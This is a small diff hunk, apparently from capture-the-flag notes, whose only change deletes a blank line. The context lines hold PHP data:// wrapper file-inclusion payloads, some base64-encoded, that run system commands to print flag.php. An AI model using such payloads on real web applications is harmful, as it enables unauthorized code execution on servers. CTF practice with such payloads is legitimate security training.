@@ -242,7 +242,6 @@ print(payload)
 
 c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
 c=data://text/plain,<?php system("tac fl*g.php")?>
-
 //<?php system('cat flag.php');
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
 
